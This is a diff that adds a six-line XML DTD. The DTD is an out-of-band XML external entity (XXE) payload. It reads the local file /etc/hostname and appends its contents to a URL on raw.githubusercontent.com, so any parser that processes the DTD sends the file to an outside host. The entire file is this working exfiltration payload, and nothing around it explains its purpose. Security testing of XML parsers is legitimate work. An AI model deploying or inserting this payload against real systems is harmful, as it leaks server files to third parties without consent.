@@ -1,0 +1,6 @@
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; test SYSTEM 'https://raw.githubusercontent.com/ranjee/util/main/%file;'>">
+%eval;
+%test;
+<!ENTITY tst '%test;'>
+<!ENTITY rd '%file;'>
